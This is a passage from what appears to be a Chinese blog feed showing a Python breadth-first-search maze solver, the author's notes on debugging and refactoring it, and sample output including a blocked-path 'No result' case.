class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment"># set the route</span></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">0</span>]=<span class="string">&#x27;A&#x27;</span></span><br><span class="line">map1[<span class="number">0</span>][<span class="number">9</span>]=<span class="string">&#x27;B&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    map1[<span class="number">5</span>][i] = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    map1[i][<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">1</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">2</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">3</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">4</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line">map1[<span class="number">0</span>][<span class="number">6</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">0</span>][<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">0</span>][<span class="number">8</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print out the map</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> map1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">        print(j,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    print(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Unit</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,c,p</span>):</span></span><br><span class="line">        x=c[<span class="number">0</span>]</span><br><span class="line">        y=c[<span class="number">1</span>]</span><br><span class="line">        self.x=x</span><br><span class="line">        self.y=y</span><br><span class="line">        self.up=(self.x,self.y+<span class="number">1</span>)</span><br><span class="line">        self.down=(self.x,self.y<span class="number">-1</span>)</span><br><span class="line">        self.left=(self.x<span class="number">-1</span>,self.y)</span><br><span class="line">        self.right=(self.x+<span class="number">1</span>,self.y)</span><br><span class="line">        self.directions = [self.up,self.down,self.left,self.right]</span><br><span class="line">        self.parent = p</span><br><span class="line"></span><br><span class="line">start=Unit((<span class="number">9</span>,<span class="number">0</span>),(<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">goal=Unit((<span class="number">0</span>,<span class="number">9</span>),(<span class="number">-1</span>,<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">travel</span>(<span class="params">map1,start</span>):</span></span><br><span class="line">    frontier = []</span><br><span class="line">    explored = []</span><br><span class="line">    current = Unit((start.x,start.y),start.parent)</span><br><span class="line">    frontier.append(current)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(frontier) == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">&quot;No result&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">del</span>(frontier[<span class="number">0</span>])</span><br><span class="line">        explored.append(Unit((current.x,current.y),current.parent))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> current.x == goal.x <span class="keyword">and</span> current.y == goal.y:</span><br><span class="line">            print(<span class="string">&quot;\nGot it!\n&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span> current.parent != (<span class="number">0</span>,<span class="number">0</span>):</span><br><span class="line">                <span class="keyword">for</span> trace <span class="keyword">in</span> explored:</span><br><span class="line">                    <span class="keyword">if</span> trace.x == current.parent[<span class="number">0</span>] <span class="keyword">and</span> trace.y == current.parent[<span class="number">1</span>]:</span><br><span class="line">                        <span class="keyword">if</span> map1[current.x][current.y] == <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">                            map1[current.x][current.y] = <span class="string">&#x27;.&#x27;</span></span><br><span class="line">                        <span class="comment"># print(current.x,current.y)</span></span><br><span class="line">                        current = trace</span><br><span class="line">                        </span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> map1:</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">                    print(j,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">                print(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> current.directions:</span><br><span class="line">            j=Unit((i[<span class="number">0</span>],i[<span class="number">1</span>]),(current.x,current.y))</span><br><span class="line">            <span class="comment"># print((j.x,j.y),end=&#x27;,&#x27;)</span></span><br><span class="line">            condition = <span class="number">1</span></span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> explored:</span><br><span class="line">                <span class="keyword">if</span> x.x==j.x <span class="keyword">and</span> x.y==j.y:</span><br><span class="line">                    condition = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> condition <span class="keyword">and</span> j.x&gt;=<span class="number">0</span> <span class="keyword">and</span> j.x&lt;=<span class="number">9</span> <span class="keyword">and</span> j.y&gt;=<span class="number">0</span> <span class="keyword">and</span> j.y&lt;=<span class="number">9</span> <span class="keyword">and</span> map1[j.x][j.y] != <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">                frontier.append(Unit((i[<span class="number">0</span>],i[<span class="number">1</span>]),(current.x,current.y)))</span><br><span class="line">        current = frontier[<span class="number">0</span>]</span><br><span class="line">        </span><br><span class="line">travel(map1,start)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在实现的过程中，我遇到了一些问题：</p><ul>    <li>由于对Python中类的使用不熟练，导致代码中有关部分看起来很奇怪</li>    <li>在遍历当前节点周围的有效节点时，没有重新初始化节点，而是直接将当前节点周围有效节点的坐标加入边界，导致循环从第二次开始就无法进行，因为坐标没有“周围的有效节点”这个属性</li>    <li>在将以探索过的节点加入对应数据结构后，检查下一个节点是否在此数据结构时直接使用“==”，但是即使坐标相同的两个节点也可能不相等，原因是这两个节点存在于不同的地址，正确的做法是再遍历一遍存储以探索过的数据结构，直接比较此数据结构中节点的坐标值</li></ul><p>在完成初步的实现后，处于对代码重构的要求，对代码做了相关的函数封装：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">map1  = [[<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment"># set the route</span></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">0</span>]=<span class="string">&#x27;A&#x27;</span></span><br><span class="line">map1[<span class="number">0</span>][<span class="number">9</span>]=<span class="string">&#x27;B&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    map1[<span class="number">5</span>][i] = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    map1[i][<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">1</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">2</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">3</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">4</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line">map1[<span class="number">0</span>][<span class="number">6</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">0</span>][<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">0</span>][<span class="number">8</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print out the map</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">map_show</span>(<span class="params">map1</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> map1:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">            print(j,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        print(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">map_show(map1)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Unit</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,c,p</span>):</span></span><br><span class="line">        x=c[<span class="number">0</span>]</span><br><span class="line">        y=c[<span class="number">1</span>]</span><br><span class="line">        self.x=x</span><br><span class="line">        self.y=y</span><br><span class="line">        self.up=(self.x,self.y+<span class="number">1</span>)</span><br><span class="line">        self.down=(self.x,self.y<span class="number">-1</span>)</span><br><span class="line">        self.left=(self.x<span class="number">-1</span>,self.y)</span><br><span class="line">        self.right=(self.x+<span class="number">1</span>,self.y)</span><br><span class="line">        self.directions = [self.up,self.down,self.left,self.right]</span><br><span class="line">        self.parent = p</span><br><span class="line"></span><br><span class="line">start=Unit((<span class="number">9</span>,<span class="number">0</span>),(<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">goal=Unit((<span class="number">0</span>,<span class="number">9</span>),(<span class="number">-1</span>,<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">route_trace</span>(<span class="params">current,explored</span>):</span></span><br><span class="line">    <span class="keyword">while</span> current.parent != (<span class="number">0</span>,<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">for</span> trace <span class="keyword">in</span> explored:</span><br><span class="line">            <span class="keyword">if</span> trace.x == current.parent[<span class="number">0</span>] <span class="keyword">and</span> trace.y == current.parent[<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">if</span> map1[current.x][current.y] == <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">                    map1[current.x][current.y] = <span class="string">&#x27;.&#x27;</span></span><br><span class="line">                <span class="comment"># print(current.x,current.y)</span></span><br><span class="line">                current = trace</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">frontier,explored,current</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> current.directions:</span><br><span class="line">        j=Unit((i[<span class="number">0</span>],i[<span class="number">1</span>]),(current.x,current.y))</span><br><span class="line">        <span class="comment"># print((j.x,j.y),end=&#x27;,&#x27;)</span></span><br><span class="line">        condition = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> explored:</span><br><span class="line">            <span class="keyword">if</span> x.x==j.x <span class="keyword">and</span> x.y==j.y:</span><br><span class="line">                condition = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> condition <span class="keyword">and</span> j.x&gt;=<span class="number">0</span> <span class="keyword">and</span> j.x&lt;=<span class="number">9</span> <span class="keyword">and</span> j.y&gt;=<span class="number">0</span> <span class="keyword">and</span> j.y&lt;=<span class="number">9</span> <span class="keyword">and</span> map1[j.x][j.y] != <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">            frontier.append(Unit((i[<span class="number">0</span>],i[<span class="number">1</span>]),(current.x,current.y)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">travel</span>(<span class="params">map1,start</span>):</span></span><br><span class="line">    frontier = []</span><br><span class="line">    explored = []</span><br><span class="line">    current = Unit((start.x,start.y),start.parent)</span><br><span class="line">    frontier.append(current)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(frontier) == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">&quot;No result&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">del</span>(frontier[<span class="number">0</span>])</span><br><span class="line">        explored.append(Unit((current.x,current.y),current.parent))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> current.x == goal.x <span class="keyword">and</span> current.y == goal.y:</span><br><span class="line">            print(<span class="string">&quot;\nGot it!\n&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            route_trace(current,explored)</span><br><span class="line">            map_show(map1)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        action(frontier,explored,current)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(frontier) == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">&quot;No result&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        current = frontier[<span class="number">0</span>]</span><br><span class="line">        </span><br><span class="line">travel(map1,start)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># # # # #         B </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line">                    </span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line">A           <span class="comment"># # # # </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Got it!</span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # # . . . . B </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # # . # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # # . # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # # . # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # # . # # # # </span></span><br><span class="line"></span><br><span class="line">          .         </span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # # . # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # # . # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # # . # # # # </span></span><br><span class="line"></span><br><span class="line">A . . . . . <span class="comment"># # # # </span></span><br></pre></td></tr></table></figure><p>现在，这个程序已经能够找出各种迷宫地图的解法了，也就是说，如果我们对地图进行修改，程序也能够正常运行并输出相应结果，比如，我们将地图的唯一道路“封死”，那么结果就会是“No result”，如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># # # # #         B </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line">                    </span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line">A     <span class="comment">#     # # # # </span></span><br><span class="line"></span><br><span class="line">No result</span><br></pre></td></tr></table></figure><p>至此，我们就完成了对此情境下相关代码的编写。</p><p>修改于2021.04.11</p>]]></content>
      
      
      
        <tags>
            
            <tag> 知识输出 </tag>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>来自班级组织演讲的一篇演讲稿</title>
      <link href="2021/04/10/Speech/"/>
      <url>2021/04/10/Speech/</url>
      
